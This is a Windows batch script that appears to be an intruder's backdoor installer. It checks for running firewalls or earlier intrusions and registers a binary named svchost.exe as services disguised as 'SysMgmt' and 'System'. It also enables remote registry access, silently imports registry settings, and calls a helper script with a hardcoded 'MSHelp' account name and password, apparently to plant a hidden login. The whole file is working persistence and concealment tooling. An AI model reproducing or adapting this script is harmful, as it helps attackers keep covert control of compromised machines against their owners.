@echo off

if "%1"=="prepare" goto prepare
if "%1"=="addreg" goto addreg
if "%1"=="start" goto start
if "%1"=="secure" goto secure
goto end

:prepare
echo ::
echo :: Preparing to setup services
echo ::
set mxbin=%3:\%2
set mxhome=%3:\%2
%3:
cd \
cd \%2
%3:\%2\pslist -t
echo If you recognise any previous attempts or running firewalls, press Ctrl-C now.
Pause
%3:\%2\instsrv.exe SysMgmt %3:\%2\svchost.exe
Pause
%3:\%2\instsrv.exe System %3:\%2\svchost.exe
Pause
goto end

:addreg
echo ::
echo :: Adding registry information
echo ::
net start RemoteRegistry
regedit /s %3:\%2\all.reg
Pause
goto end

:start
echo ::
echo :: Starting Services
echo ::
net start SysMgmt
net start System
Pause
goto end

:secure
echo ::
echo :: Securing system
echo ::
call %3:\%2\secure.bat MSHelp h4#Gbx@Z %3
Pause
goto end

:end